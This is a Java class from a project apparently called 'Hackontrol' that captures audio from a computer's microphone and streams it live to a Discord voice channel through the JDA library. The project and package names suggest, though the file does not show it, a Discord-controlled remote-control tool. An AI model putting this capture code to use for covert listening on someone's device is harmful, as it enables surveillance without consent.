package com.khopan.hackontrol.channel.control;

import java.nio.ByteBuffer;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine.Info;
import javax.sound.sampled.TargetDataLine;

import net.dv8tion.jda.api.audio.AudioSendHandler;

class MicrophoneSendHandler implements AudioSendHandler {
	private final TargetDataLine line;
	private final AudioInputStream stream;
	private final int size;

	private volatile boolean open;

	MicrophoneSendHandler() throws Throwable {
		Info info = new Info(TargetDataLine.class, AudioSendHandler.INPUT_FORMAT);
		this.line = (TargetDataLine) AudioSystem.getLine(info);
		this.line.open();
		this.line.start();
		this.stream = new AudioInputStream(this.line);
		this.size = Math.round(AudioSendHandler.INPUT_FORMAT.getSampleRate() * 0.02f * ((float) AudioSendHandler.INPUT_FORMAT.getChannels()) * ((float) AudioSendHandler.INPUT_FORMAT.getSampleSizeInBits()) * 0.125f);
		this.open = true;
	}

	@Override
	public boolean canProvide() {
		return this.open;
	}

	@Override
	public ByteBuffer provide20MsAudio() {
		try {
			return ByteBuffer.wrap(this.stream.readNBytes(this.size));
		} catch(Throwable Errors) {
			return ByteBuffer.allocate(0);
		}
	}

	void close() throws Throwable {
		this.open = false;
		this.line.stop();
		this.line.close();
		this.stream.close();
	}
}
